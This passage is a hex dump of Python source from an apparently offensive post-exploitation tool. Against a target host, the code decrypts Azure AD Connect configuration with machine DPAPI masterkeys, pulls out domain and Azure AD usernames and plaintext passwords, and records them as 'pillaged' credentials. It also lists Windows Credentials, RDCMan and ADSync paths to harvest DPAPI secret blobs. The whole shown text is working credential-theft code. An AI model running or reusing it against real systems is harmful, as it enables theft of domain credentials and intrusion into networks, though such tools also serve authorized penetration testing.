+000087f0: 2072 6573 756c 745b 276b 6579 7365 745f   result['keyset_
+00008800: 6964 275d 2c20 7265 7375 6c74 5b27 696e  id'], result['in
+00008810: 7374 616e 6365 6964 275d 2c20 6d64 6264  stanceid'], mdbd
+00008820: 6174 615b 276b 6579 7365 745f 6964 275d  ata['keyset_id']
+00008830: 2c20 6d64 6264 6174 615b 2769 6e73 7461  , mdbdata['insta
+00008840: 6e63 6527 5d29 0a09 0909 656c 7365 3a0a  nce'])....else:.
+00008850: 0909 0909 6c6f 6767 696e 672e 6465 6275  ....logging.debu
+00008860: 6728 2746 6f75 6e64 2063 6f72 7265 6374  g('Found correct
+00008870: 2065 6e63 7279 7074 6564 206b 6579 7365   encrypted keyse
+00008880: 7420 746f 2064 6563 7279 7074 2064 6174  t to decrypt dat
+00008890: 6127 290a 0909 6966 2072 6573 756c 7420  a')...if result 
+000088a0: 6973 204e 6f6e 653a 0a09 0909 6c6f 6767  is None:....logg
+000088b0: 696e 672e 6465 6275 6728 2746 6169 6c65  ing.debug('Faile
+000088c0: 6420 746f 2066 696e 6420 636f 7272 6563  d to find correc
+000088d0: 7420 6b65 7973 6574 2064 6174 6127 290a  t keyset data').
+000088e0: 0909 0972 6574 7572 6e0a 0a09 0923 2063  ...return....# c
+000088f0: 7279 7074 6b65 7973 203d 205b 7365 6c66  ryptkeys = [self
+00008900: 2e5f 5f72 656d 6f74 654f 7073 2e64 6563  .__remoteOps.dec
+00008910: 7279 7074 4470 6170 6942 6c6f 6253 7973  ryptDpapiBlobSys
+00008920: 7465 6d6b 6579 2872 6573 756c 745b 2764  temkey(result['d
+00008930: 6174 6127 5d2c 2073 656c 662e 6470 6170  ata'], self.dpap
+00008940: 6953 7973 7465 6d5b 274d 6163 6869 6e65  iSystem['Machine
+00008950: 4b65 7927 5d2c 7374 7269 6e67 5f74 6f5f  Key'],string_to_
+00008960: 6269 6e28 6d64 6264 6174 615b 2765 6e74  bin(mdbdata['ent
+00008970: 726f 7079 275d 2929 5d0a 0909 6d79 6f70  ropy']))]...myop
+00008980: 7469 6f6e 7320 3d20 636f 7079 2e64 6565  tions = copy.dee
+00008990: 7063 6f70 7928 7365 6c66 2e6f 7074 696f  pcopy(self.optio
+000089a0: 6e73 290a 0909 6d79 6f70 7469 6f6e 732e  ns)...myoptions.
+000089b0: 6669 6c65 203d 204e 6f6e 6520 2023 2022  file = None  # "
+000089c0: 6b65 795f 6d61 7465 7269 616c 2e74 6d70  key_material.tmp
+000089d0: 2220 2023 2042 4c4f 4220 746f 2070 6172  "  # BLOB to par
+000089e0: 7365 0a09 096d 796f 7074 696f 6e73 2e6b  se...myoptions.k
+000089f0: 6579 203d 204e 6f6e 650a 0909 6d79 6f70  ey = None...myop
+00008a00: 7469 6f6e 732e 6d61 7374 6572 6b65 7973  tions.masterkeys
+00008a10: 203d 204e 6f6e 6520 2023 2075 7365 722e   = None  # user.
+00008a20: 6d61 7374 6572 6b65 7973 5f66 696c 650a  masterkeys_file.
+00008a30: 0909 6d79 6470 6170 6920 3d20 4450 4150  ..mydpapi = DPAP
+00008a40: 4928 6d79 6f70 7469 6f6e 732c 2073 656c  I(myoptions, sel
+00008a50: 662e 6c6f 6767 696e 6729 0a09 0967 7569  f.logging)...gui
+00008a60: 6420 3d20 6d79 6470 6170 692e 6669 6e64  d = mydpapi.find
+00008a70: 5f42 6c6f 625f 6d61 7374 6572 6b65 7928  _Blob_masterkey(
+00008a80: 7261 775f 6461 7461 3d72 6573 756c 745b  raw_data=result[
+00008a90: 2764 6174 6127 5d29 0a09 0973 656c 662e  'data'])...self.
+00008aa0: 6c6f 6767 696e 672e 6465 6275 6728 6622  logging.debug(f"
+00008ab0: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
+00008ac0: 6172 6765 745f 6970 7d5d 204c 6f6f 6b69  arget_ip}] Looki
+00008ad0: 6e67 2066 6f72 2041 4443 6f6e 6e65 6374  ng for ADConnect
+00008ae0: 206d 6173 7465 726b 6579 203a 207b 6775   masterkey : {gu
+00008af0: 6964 7d22 290a 0909 6966 2067 7569 6420  id}")...if guid 
+00008b00: 213d 204e 6f6e 653a 0a09 0909 6d61 6368  != None:....mach
+00008b10: 696e 655f 7573 6572 203d 2075 7365 7220  ine_user = user 
+00008b20: 3d20 7365 6c66 2e47 6574 5573 6572 4279  = self.GetUserBy
+00008b30: 4e61 6d65 2827 4d41 4348 494e 4524 2729  Name('MACHINE$')
+00008b40: 0a09 0909 6d61 7374 6572 6b65 7920 3d20  ....masterkey = 
+00008b50: 7365 6c66 2e67 6574 5f6d 6173 7465 726b  self.get_masterk
+00008b60: 6579 2875 7365 723d 6d61 6368 696e 655f  ey(user=machine_
+00008b70: 7573 6572 2c20 6775 6964 3d67 7569 642c  user, guid=guid,
+00008b80: 2074 7970 653d 274d 4143 4849 4e45 2729   type='MACHINE')
+00008b90: 0a09 0909 6966 206d 6173 7465 726b 6579  ....if masterkey
+00008ba0: 2021 3d20 4e6f 6e65 3a0a 0909 0909 6966   != None:.....if
+00008bb0: 206d 6173 7465 726b 6579 5b27 7374 6174   masterkey['stat
+00008bc0: 7573 275d 203d 3d20 2764 6563 7279 7074  us'] == 'decrypt
+00008bd0: 6564 273a 0a09 0909 0909 6d79 6470 6170  ed':......mydpap
+00008be0: 692e 6f70 7469 6f6e 732e 6b65 7920 3d20  i.options.key = 
+00008bf0: 6d61 7374 6572 6b65 795b 276b 6579 275d  masterkey['key']
+00008c00: 0a09 0909 0909 2320 6372 6564 5f64 6174  ......# cred_dat
+00008c10: 6120 3d20 6d79 6470 6170 692e 6465 6372  a = mydpapi.decr
+00008c20: 7970 745f 6372 6564 656e 7469 616c 2829  ypt_credential()
+00008c30: 0a09 0909 0909 6372 7970 746b 6579 7320  ......cryptkeys 
+00008c40: 3d20 5b0a 0909 0909 0909 6d79 6470 6170  = [.......mydpap
+00008c50: 692e 6465 6372 7970 745f 626c 6f62 2872  i.decrypt_blob(r
+00008c60: 6177 5f64 6174 613d 7265 7375 6c74 5b27  aw_data=result['
+00008c70: 6461 7461 275d 2c20 656e 7472 6f70 793d  data'], entropy=
+00008c80: 7374 7269 6e67 5f74 6f5f 6269 6e28 6d64  string_to_bin(md
+00008c90: 6264 6174 615b 2765 6e74 726f 7079 275d  bdata['entropy']
+00008ca0: 2929 5d0a 0909 0909 0974 7279 3a0a 0909  ))]......try:...
+00008cb0: 0909 0909 6c6f 6767 696e 672e 6465 6275  ....logging.debu
+00008cc0: 6728 6627 4465 6372 7970 7469 6e67 2065  g(f'Decrypting e
+00008cd0: 6e63 7279 7074 6564 2041 4420 5379 6e63  ncrypted AD Sync
+00008ce0: 2063 6f6e 6669 6775 7261 7469 6f6e 2064   configuration d
+00008cf0: 6174 6120 7769 7468 207b 6372 7970 746b  ata with {cryptk
+00008d00: 6579 737d 2729 0a09 0909 0909 0966 6f72  eys}').......for
+00008d10: 2069 6e64 6578 2c20 7265 636f 7264 2069   index, record i
+00008d20: 6e20 656e 756d 6572 6174 6528 6d64 6264  n enumerate(mdbd
+00008d30: 6174 615b 2763 7279 7074 6564 7265 636f  ata['cryptedreco
+00008d40: 7264 7327 5d29 3a0a 0909 0909 0909 0923  rds']):........#
+00008d50: 2054 7279 2064 6563 7279 7074 696e 6720   Try decrypting 
+00008d60: 7769 7468 2068 6967 6865 7374 2063 7279  with highest cry
+00008d70: 7074 6b65 7920 7265 636f 7264 0a09 0909  ptkey record....
+00008d80: 0909 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
+00008d90: 2e64 6562 7567 2866 225b 7b73 656c 662e  .debug(f"[{self.
+00008da0: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
+00008db0: 707d 5d20 7b69 6e64 6578 7d20 2d20 7b72  p}] {index} - {r
+00008dc0: 6563 6f72 647d 2229 0a09 0909 0909 0909  ecord}")........
+00008dd0: 6472 6563 6f72 6420 3d20 4475 6d70 5365  drecord = DumpSe
+00008de0: 6372 6574 732e 6465 6372 7970 7428 7265  crets.decrypt(re
+00008df0: 636f 7264 2c20 6372 7970 746b 6579 735b  cord, cryptkeys[
+00008e00: 2d31 5d29 2e72 6570 6c61 6365 2827 5c78  -1]).replace('\x
+00008e10: 3030 272c 2027 2729 0a09 0909 0909 0909  00', '')........
+00008e20: 2320 7072 696e 7428 6472 6563 6f72 6429  # print(drecord)
+00008e30: 0a09 0909 0909 0909 7769 7468 206f 7065  ........with ope
+00008e40: 6e28 2772 2564 5f78 6d6c 5f64 6174 612e  n('r%d_xml_data.
+00008e50: 786d 6c27 2025 2069 6e64 6578 2c20 2777  xml' % index, 'w
+00008e60: 2729 2061 7320 6f75 7466 696c 653a 0a09  ') as outfile:..
+00008e70: 0909 0909 0909 0964 6174 6120 3d20 6261  .......data = ba
+00008e80: 7365 3634 2e62 3634 6465 636f 6465 286d  se64.b64decode(m
+00008e90: 6462 6461 7461 5b27 786d 6c64 6174 6127  dbdata['xmldata'
+00008ea0: 5d5b 696e 6465 785d 292e 6465 636f 6465  ][index]).decode
+00008eb0: 2827 7574 662d 3136 2d6c 6527 290a 0909  ('utf-16-le')...
+00008ec0: 0909 0909 0909 6f75 7466 696c 652e 7772  ......outfile.wr
+00008ed0: 6974 6528 6461 7461 290a 0909 0909 0909  ite(data).......
+00008ee0: 0977 6974 6820 6f70 656e 2827 7225 645f  .with open('r%d_
+00008ef0: 656e 6372 7970 7465 645f 6461 7461 2e78  encrypted_data.x
+00008f00: 6d6c 2720 2520 696e 6465 782c 2027 7727  ml' % index, 'w'
+00008f10: 2920 6173 206f 7574 6669 6c65 3a0a 0909  ) as outfile:...
+00008f20: 0909 0909 0909 6f75 7466 696c 652e 7772  ......outfile.wr
+00008f30: 6974 6528 6472 6563 6f72 6429 0a09 0909  ite(drecord)....
+00008f40: 0909 0909 6374 7265 6520 3d20 4554 2e66  ....ctree = ET.f
+00008f50: 726f 6d73 7472 696e 6728 6472 6563 6f72  romstring(drecor
+00008f60: 6429 0a09 0909 0909 0909 6474 7265 6520  d)........dtree 
+00008f70: 3d20 4554 2e66 726f 6d73 7472 696e 6728  = ET.fromstring(
+00008f80: 6461 7461 290a 0909 0909 0909 0969 6620  data)........if 
+00008f90: 2766 6f72 6573 742d 6c6f 6769 6e2d 7573  'forest-login-us
+00008fa0: 6572 2720 696e 2064 6174 613a 0a09 0909  er' in data:....
+00008fb0: 0909 0909 096c 6f67 6769 6e67 2e64 6562  .....logging.deb
+00008fc0: 7567 2827 4c6f 6361 6c20 4144 2063 7265  ug('Local AD cre
+00008fd0: 6465 6e74 6961 6c73 2729 0a09 0909 0909  dentials')......
+00008fe0: 0909 0965 6c20 3d20 6474 7265 652e 6669  ...el = dtree.fi
+00008ff0: 6e64 2822 2e2f 2f70 6172 616d 6574 6572  nd(".//parameter
+00009000: 5b40 6e61 6d65 3d27 666f 7265 7374 2d6c  [@name='forest-l
+00009010: 6f67 696e 2d64 6f6d 6169 6e27 5d22 290a  ogin-domain']").
+00009020: 0909 0909 0909 0909 6966 2065 6c20 6973  ........if el is
+00009030: 206e 6f74 204e 6f6e 653a 0a09 0909 0909   not None:......
+00009040: 0909 0909 6c6f 6767 696e 672e 6465 6275  ....logging.debu
+00009050: 6728 275c 7444 6f6d 6169 6e3a 2025 7327  g('\tDomain: %s'
+00009060: 2c20 656c 2e74 6578 7429 0a09 0909 0909  , el.text)......
+00009070: 0909 0909 7573 6572 6e61 6d65 203d 2065  ....username = e
+00009080: 6c2e 7465 7874 0a09 0909 0909 0909 0965  l.text.........e
+00009090: 6c20 3d20 6474 7265 652e 6669 6e64 2822  l = dtree.find("
+000090a0: 2e2f 2f70 6172 616d 6574 6572 5b40 6e61  .//parameter[@na
+000090b0: 6d65 3d27 666f 7265 7374 2d6c 6f67 696e  me='forest-login
+000090c0: 2d75 7365 7227 5d22 290a 0909 0909 0909  -user']").......
+000090d0: 0909 6966 2065 6c20 6973 206e 6f74 204e  ..if el is not N
+000090e0: 6f6e 653a 0a09 0909 0909 0909 0909 7573  one:..........us
+000090f0: 6572 6e61 6d65 202b 3d20 272f 2720 2b20  ername += '/' + 
+00009100: 656c 2e74 6578 740a 0909 0909 0909 0923  el.text........#
+00009110: 206c 6f67 6769 6e67 2e64 6562 7567 2827   logging.debug('
+00009120: 5c74 5573 6572 6e61 6d65 3a20 2573 272c  \tUsername: %s',
+00009130: 2065 6c2e 7465 7874 290a 0909 0909 0909   el.text).......
+00009140: 0965 6c73 653a 0a09 0909 0909 0909 0923  .else:.........#
+00009150: 2041 7373 756d 6520 4141 4420 636f 6e66   Assume AAD conf
+00009160: 6967 0a09 0909 0909 0909 096c 6f67 6769  ig.........loggi
+00009170: 6e67 2e64 6562 7567 2827 417a 7572 6520  ng.debug('Azure 
+00009180: 4144 2063 7265 6465 6e74 6961 6c73 2729  AD credentials')
+00009190: 0a09 0909 0909 0909 0965 6c20 3d20 6474  .........el = dt
+000091a0: 7265 652e 6669 6e64 2822 2e2f 2f70 6172  ree.find(".//par
+000091b0: 616d 6574 6572 5b40 6e61 6d65 3d27 5573  ameter[@name='Us
+000091c0: 6572 4e61 6d65 275d 2229 0a09 0909 0909  erName']")......
+000091d0: 0909 0969 6620 656c 2069 7320 6e6f 7420  ...if el is not 
+000091e0: 4e6f 6e65 3a0a 0909 0909 0909 0909 0975  None:..........u
+000091f0: 7365 726e 616d 6520 3d20 656c 2e74 6578  sername = el.tex
+00009200: 740a 0909 0909 0909 0909 096c 6f67 6769  t..........loggi
+00009210: 6e67 2e64 6562 7567 2827 5c74 5573 6572  ng.debug('\tUser
+00009220: 6e61 6d65 3a20 2573 272c 2065 6c2e 7465  name: %s', el.te
+00009230: 7874 290a 0909 0909 0909 0923 2043 616e  xt)........# Can
+00009240: 2062 6520 6569 7468 6572 206c 6f77 6572   be either lower
+00009250: 206f 7220 7769 7468 2063 6170 6974 616c   or with capital
+00009260: 2050 0a09 0909 0909 0909 6670 7720 3d20   P........fpw = 
+00009270: 4e6f 6e65 0a09 0909 0909 0909 656c 203d  None........el =
+00009280: 2063 7472 6565 2e66 696e 6428 222e 2f2f   ctree.find(".//
+00009290: 6174 7472 6962 7574 655b 406e 616d 653d  attribute[@name=
+000092a0: 2750 6173 7377 6f72 6427 5d22 290a 0909  'Password']")...
+000092b0: 0909 0909 0969 6620 656c 2069 7320 6e6f  .....if el is no
+000092c0: 7420 4e6f 6e65 3a0a 0909 0909 0909 0909  t None:.........
+000092d0: 6670 7720 3d20 656c 2e74 6578 740a 0909  fpw = el.text...
+000092e0: 0909 0909 0965 6c20 3d20 6374 7265 652e  .....el = ctree.
+000092f0: 6669 6e64 2822 2e2f 2f61 7474 7269 6275  find(".//attribu
+00009300: 7465 5b40 6e61 6d65 3d27 7061 7373 776f  te[@name='passwo
+00009310: 7264 275d 2229 0a09 0909 0909 0909 6966  rd']")........if
+00009320: 2065 6c20 6973 206e 6f74 204e 6f6e 653a   el is not None:
+00009330: 0a09 0909 0909 0909 0966 7077 203d 2065  .........fpw = e
+00009340: 6c2e 7465 7874 0a09 0909 0909 0909 6966  l.text........if
+00009350: 2066 7077 3a0a 0909 0909 0909 0909 2320   fpw:.........# 
+00009360: 6670 7720 3d20 6670 775b 3a6c 656e 2866  fpw = fpw[:len(f
+00009370: 7077 292f 325d 202b 2027 2e2e 2e5b 5245  pw)/2] + '...[RE
+00009380: 4441 4354 4544 5d27 0a09 0909 0909 0909  DACTED]'........
+00009390: 096c 6f67 6769 6e67 2e64 6562 7567 2827  .logging.debug('
+000093a0: 5c74 5061 7373 776f 7264 3a20 2573 272c  \tPassword: %s',
+000093b0: 2066 7077 290a 0909 0909 0909 0909 696e   fpw).........in
+000093c0: 666f 202b 3d20 6622 7b75 7365 726e 616d  fo += f"{usernam
+000093d0: 657d 203a 207b 6670 777d 5c6e 220a 0909  e} : {fpw}\n"...
+000093e0: 0909 0909 0909 7365 6c66 2e6c 6f67 6769  ......self.loggi
+000093f0: 6e67 2e69 6e66 6f28 0a09 0909 0909 0909  ng.info(........
+00009400: 0909 6622 5b7b 7365 6c66 2e6f 7074 696f  ..f"[{self.optio
+00009410: 6e73 2e74 6172 6765 745f 6970 7d5d 205b  ns.target_ip}] [
+00009420: 2b5d 207b 6263 6f6c 6f72 732e 4f4b 4752  +] {bcolors.OKGR
+00009430: 4545 4e7d 2041 4443 4f4e 4e45 4354 203a  EEN} ADCONNECT :
+00009440: 207b 6263 6f6c 6f72 732e 4f4b 4752 4545   {bcolors.OKGREE
+00009450: 4e7d 202d 207b 7573 6572 6e61 6d65 7d20  N} - {username} 
+00009460: 3a20 7b66 7077 7d7b 6263 6f6c 6f72 732e  : {fpw}{bcolors.
+00009470: 454e 4443 7d22 290a 0909 0909 0909 0909  ENDC}").........
+00009480: 2323 2323 2323 2323 2323 2323 5052 4f43  ############PROC
+00009490: 4553 5349 4e47 2044 4154 410a 0909 0909  ESSING DATA.....
+000094a0: 0909 0909 7365 6c66 2e64 622e 6164 645f  ....self.db.add_
+000094b0: 6372 6564 7a28 6372 6564 7a5f 7479 7065  credz(credz_type
+000094c0: 3d27 4144 436f 6e6e 6563 7427 2c0a 0909  ='ADConnect',...
+000094d0: 0909 0909 0909 0909 0909 2020 6372 6564  ..........  cred
+000094e0: 7a5f 7573 6572 6e61 6d65 3d75 7365 726e  z_username=usern
+000094f0: 616d 652c 0a09 0909 0909 0909 0909 0909  ame,............
+00009500: 0920 2063 7265 647a 5f70 6173 7377 6f72  .  credz_passwor
+00009510: 643d 6670 772c 0a09 0909 0909 0909 0909  d=fpw,..........
+00009520: 0909 0920 2063 7265 647a 5f74 6172 6765  ...  credz_targe
+00009530: 743d 2727 2c0a 0909 0909 0909 0909 0909  t='',...........
+00009540: 0909 2020 6372 6564 7a5f 7061 7468 3d27  ..  credz_path='
+00009550: 272c 2020 2320 7573 6572 2e66 696c 6573  ',  # user.files
+00009560: 5b27 4144 434f 4e4e 4543 5427 5d5b 2770  ['ADCONNECT']['p
+00009570: 6174 6827 5d2c 0a09 0909 0909 0909 0909  ath'],..........
+00009580: 0909 0920 2070 696c 6c61 6765 645f 6672  ...  pillaged_fr
+00009590: 6f6d 5f63 6f6d 7075 7465 725f 6970 3d73  om_computer_ip=s
+000095a0: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
+000095b0: 6574 5f69 702c 0a09 0909 0909 0909 0909  et_ip,..........
+000095c0: 0909 0920 2070 696c 6c61 6765 645f 6672  ...  pillaged_fr
+000095d0: 6f6d 5f75 7365 726e 616d 653d 7573 6572  om_username=user
+000095e0: 2e75 7365 726e 616d 6529 0a09 0909 0909  .username)......
+000095f0: 6578 6365 7074 2045 7863 6570 7469 6f6e  except Exception
+00009600: 2061 7320 6578 3a0a 0909 0909 0909 7365   as ex:.......se
+00009610: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
+00009620: 280a 0909 0909 0909 0966 225b 7b73 656c  (........f"[{sel
+00009630: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
+00009640: 5f69 707d 5d20 7b62 636f 6c6f 7273 2e57  _ip}] {bcolors.W
+00009650: 4152 4e49 4e47 7d45 7863 6570 7469 6f6e  ARNING}Exception
+00009660: 2069 6e20 4765 745f 4144 5f43 6f6e 6e65   in Get_AD_Conne
+00009670: 6374 2032 7b62 636f 6c6f 7273 2e45 4e44  ct 2{bcolors.END
+00009680: 437d 2229 0a09 0909 0909 0973 656c 662e  C}").......self.
+00009690: 6c6f 6767 696e 672e 6465 6275 6728 6578  logging.debug(ex
+000096a0: 290a 0909 0965 6c73 653a 0a09 0909 0973  )....else:.....s
+000096b0: 656c 662e 6c6f 6767 696e 672e 696e 666f  elf.logging.info
+000096c0: 280a 0909 0909 0966 225b 7b73 656c 662e  (......f"[{self.
+000096d0: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
+000096e0: 707d 5d20 5b2b 5d20 7b62 636f 6c6f 7273  p}] [+] {bcolors
+000096f0: 2e57 4152 4e49 4e47 7d20 4d61 7374 6572  .WARNING} Master
+00009700: 6b65 7920 4e4f 5420 466f 756e 6420 666f  key NOT Found fo
+00009710: 7220 4144 436f 6e6e 6563 7420 7b62 636f  r ADConnect {bco
+00009720: 6c6f 7273 2e45 4e44 437d 2229 0a09 0972  lors.ENDC}")...r
+00009730: 6574 7572 6e20 696e 666f 0a0a 0964 6566  eturn info...def
+00009740: 2047 6574 5f44 5041 5049 5f50 726f 7465   Get_DPAPI_Prote
+00009750: 6374 6564 5f46 696c 6573 2873 656c 6629  cted_Files(self)
+00009760: 3a0a 0909 7365 6c66 2e6c 6f67 6769 6e67  :...self.logging
+00009770: 2e69 6e66 6f28 0a09 0909 6622 5b7b 7365  .info(....f"[{se
+00009780: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
+00009790: 745f 6970 7d5d 207b 6263 6f6c 6f72 732e  t_ip}] {bcolors.
+000097a0: 4f4b 424c 5545 7d5b 2b5d 2047 6174 6865  OKBLUE}[+] Gathe
+000097b0: 7269 6e67 2044 5041 5049 2053 6563 7265  ring DPAPI Secre
+000097c0: 7420 626c 6f62 7320 6f6e 2074 6865 2074  t blobs on the t
+000097d0: 6172 6765 747b 6263 6f6c 6f72 732e 454e  arget{bcolors.EN
+000097e0: 4443 7d22 290a 0909 626c 6163 6b6c 6973  DC}")...blacklis
+000097f0: 7420 3d20 5b27 2e27 2c20 272e 2e27 5d0a  t = ['.', '..'].
+00009800: 0909 2320 6372 6564 656e 7469 616c 7320  ..# credentials 
+00009810: 3f0a 0909 2320 5661 756c 7473 203f 0a09  ?...# Vaults ?..
+00009820: 0923 2050 6172 7365 2063 6872 6f6d 650a  .# Parse chrome.
+00009830: 0909 2320 6175 7472 6573 206e 6176 6967  ..# autres navig
+00009840: 6174 6575 7273 203f 0a09 0923 2043 7265  ateurs ?...# Cre
+00009850: 6448 6973 746f 7279 0a09 0923 2041 7070  dHistory...# App
+00009860: 6461 7461 2052 6f61 6d69 6e67 203f 0a0a  data Roaming ?..
+00009870: 0909 7573 6572 5f64 6972 6563 746f 7269  ..user_directori
+00009880: 6573 203d 205b 2822 5573 6572 735c 5c7b  es = [("Users\\{
+00009890: 7573 6572 6e61 6d65 7d5c 5c41 7070 4461  username}\\AppDa
+000098a0: 7461 5c5c 4c6f 6361 6c5c 5c4d 6963 726f  ta\\Local\\Micro
+000098b0: 736f 6674 5c5c 4372 6564 656e 7469 616c  soft\\Credential
+000098c0: 7322 2c20 272a 272c 2027 6372 6564 656e  s", '*', 'creden
+000098d0: 7469 616c 272c 2027 444f 4d41 494e 2729  tial', 'DOMAIN')
+000098e0: 2c0a 0909 0909 0909 0928 2257 696e 646f  ,........("Windo
+000098f0: 7773 5c5c 5365 7276 6963 6550 726f 6669  ws\\ServiceProfi
+00009900: 6c65 735c 5c41 4453 796e 635c 5c41 7070  les\\ADSync\\App
+00009910: 4461 7461 5c5c 4c6f 6361 6c5c 5c4d 6963  Data\\Local\\Mic
+00009920: 726f 736f 6674 5c5c 4372 6564 656e 7469  rosoft\\Credenti
+00009930: 616c 7322 2c20 272a 272c 0a09 0909 0909  als", '*',......
+00009940: 0909 2027 6372 6564 656e 7469 616c 272c  .. 'credential',
+00009950: 2027 4d41 4348 494e 452d 5553 4552 2729   'MACHINE-USER')
+00009960: 2c0a 0909 0909 0909 0928 0a09 0909 0909  ,........(......
+00009970: 0909 2255 7365 7273 5c5c 7b75 7365 726e  .."Users\\{usern
+00009980: 616d 657d 5c5c 4170 7044 6174 615c 5c52  ame}\\AppData\\R
+00009990: 6f61 6d69 6e67 5c5c 4d69 6372 6f73 6f66  oaming\\Microsof
+000099a0: 745c 5c43 7265 6465 6e74 6961 6c73 222c  t\\Credentials",
+000099b0: 2027 2a27 2c20 2763 7265 6465 6e74 6961   '*', 'credentia
+000099c0: 6c27 2c20 2744 4f4d 4149 4e27 292c 0a09  l', 'DOMAIN'),..
+000099d0: 0909 0909 0909 280a 0909 0909 0909 0922  ......(........"
+000099e0: 5573 6572 735c 5c7b 7573 6572 6e61 6d65  Users\\{username
+000099f0: 7d5c 5c41 7070 4461 7461 5c5c 4c6f 6361  }\\AppData\\Loca
+00009a00: 6c5c 5c4d 6963 726f 736f 6674 5c5c 5265  l\\Microsoft\\Re
+00009a10: 6d6f 7465 2044 6573 6b74 6f70 2043 6f6e  mote Desktop Con
+00009a20: 6e65 6374 696f 6e20 4d61 6e61 6765 725c  nection Manager\
+00009a30: 5c52 4443 4d61 6e2e 7365 7474 696e 6773  \RDCMan.settings
+00009a40: 222c 0a09 0909 0909 0909 222a 2e72 6467  ",........"*.rdg
+00009a50: 222c 2027 7264 6727 2c20 2744 4f4d 4149  ", 'rdg', 'DOMAI
+00009a60: 4e27 290a 0909 0909 0909 095d 2020 2320  N')........]  # 
+00009a70: 4144 4420 4465 736b 746f 7020 666f 7220  ADD Desktop for 
+00009a80: 5244 470a 0909 6d61 6368 696e 655f 6469  RDG...machine_di
+00009a90: 7265 6374 6f72 6965 7320 3d20 5b28 2257  rectories = [("W
+00009aa0: 696e 646f 7773 5c5c 5379 7374 656d 3332  indows\\System32
+00009ab0: 5c5c 636f 6e66 6967 5c5c 7379 7374 656d  \\config\\system
+00009ac0: 7072 6f66 696c 655c 5c41 7070 4461 7461  profile\\AppData
+00009ad0: 5c5c 4c6f 6361 6c5c 5c4d 6963 726f 736f  \\Local\\Microso
+00009ae0: 6674 5c5c 4372 6564 656e 7469 616c 7322  ft\\Credentials"
+00009af0: 2c20 272a 272c 0a09 0909 0909 0909 0927  , '*',.........'
+00009b00: 6372 6564 656e 7469 616c 272c 2027 4d41  credential', 'MA
+00009b10: 4348 494e 4527 292c 0a09 0909 0909 0909  CHINE'),........
+00009b20: 2020 2028 2257 696e 646f 7773 5c5c 5365     ("Windows\\Se
+00009b30: 7276 6963 6550 726f 6669 6c65 735c 5c41  rviceProfiles\\A
+00009b40: 4453 796e 635c 5c41 7070 4461 7461 5c5c  DSync\\AppData\\
+00009b50: 4c6f 6361 6c5c 5c4d 6963 726f 736f 6674  Local\\Microsoft
+00009b60: 5c5c 4372 6564 656e 7469 616c 7322 2c20  \\Credentials", 
+00009b70: 272a 272c 0a09 0909 0909 0909 0927 6372  '*',.........'cr
+00009b80: 6564 656e 7469 616c 272c 2027 4d41 4348  edential', 'MACH
+00009b90: 494e 452d 5553 4552 2729 2c0a 0909 0909  INE-USER'),.....
+00009ba0: 0909 0920 2020 2822 5573 6572 735c 5c41  ...   ("Users\\A
+00009bb0: 4453 796e 635c 5c41 7070 4461 7461 5c5c  DSync\\AppData\\
+00009bc0: 4c6f 6361 6c5c 5c4d 6963 726f 736f 6674  Local\\Microsoft
+00009bd0: 5c5c 4372 6564 656e 7469 616c 7322 2c20  \\Credentials", 
+00009be0: 272a 272c 2027 6372 6564 656e 7469 616c  '*', 'credential
+00009bf0: 272c 0a09 0909 0909 0909 0927 4d41 4348  ',.........'MACH
+00009c00: 494e 452d 5553 4552 2729 2c0a 0909 0909  INE-USER'),.....
+00009c10: 0909 0920 2020 2320 5661 6c69 6465 7220  ...   # Valider 
+00009c20: 6c65 2025 7379 7374 656d 6469 7225 2073  le %systemdir% s
+00009c30: 656c 6f6e 206c 6120 7665 7273 696f 6e20  elon la version 
+00009c40: 6465 2077 696e 646f 7773 203f 0a09 0909  de windows ?....
+00009c50: 0909 0909 2020 205d 0a0a 0909 666f 7220  ....   ]....for 
+00009c60: 7573 6572 2069 6e20 7365 6c66 2e75 7365  user in self.use
+00009c70: 7273 3a0a 0909 0969 6620 7573 6572 2e75  rs:....if user.u
+00009c80: 7365 726e 616d 6520 3d3d 2027 4d41 4348  sername == 'MACH
+00009c90: 494e 4524 273a 0a09 0909 0964 6972 6563  INE$':.....direc
+00009ca0: 746f 7269 6573 5f74 6f5f 7573 6520 3d20  tories_to_use = 
+00009cb0: 6d61 6368 696e 655f 6469 7265 6374 6f72  machine_director
+00009cc0: 6965 730a 0909 0965 6c73 653a 0a09 0909  ies....else:....
+00009cd0: 0964 6972 6563 746f 7269 6573 5f74 6f5f  .directories_to_
+00009ce0: 7573 6520 3d20 7573 6572 5f64 6972 6563  use = user_direc
+00009cf0: 746f 7269 6573 0a0a 0909 0923 2069 6620  tories.....# if 
+00009d00: 6c65 6e28 7573 6572 2e6d 6173 7465 726b  len(user.masterk
+00009d10: 6579 7329 3e30 3a23 5061 7320 6465 206d  eys)>0:#Pas de m
+00009d20: 6173 7465 726b 6579 733d 3d70 6173 2064  asterkeys==pas d
+00009d30: 6520 6461 7461 7320 6120 7265 6375 700a  e datas a recup.
+00009d40: 0909 0966 6f72 2069 6e66 6f20 696e 2064  ...for info in d
+00009d50: 6972 6563 746f 7269 6573 5f74 6f5f 7573  irectories_to_us
+00009d60: 653a 0a09 0909 096d 795f 6469 722c 206d  e:.....my_dir, m
+00009d70: 795f 6d61 736b 2c20 6d79 5f62 6c6f 625f  y_mask, my_blob_
+00009d80: 7479 7065 2c20 6d79 5f75 7365 725f 7479  type, my_user_ty
+00009d90: 7065 203d 2069 6e66 6f0a 0909 0909 746d  pe = info.....tm
+00009da0: 705f 7077 6420 3d20 6d79 5f64 6972 2e66  p_pwd = my_dir.f
+00009db0: 6f72 6d61 7428 0a09 0909 0909 7573 6572  ormat(......user
+00009dc0: 6e61 6d65 3d75 7365 722e 7573 6572 6e61  name=user.userna
+00009dd0: 6d65 2920 2023 236e 7470 6174 682e 6a6f  me)  ##ntpath.jo
+00009de0: 696e 286e 7470 6174 682e 6a6f 696e 2827  in(ntpath.join('
+00009df0: 5573 6572 7327 2c20 7573 6572 2e75 7365  Users', user.use
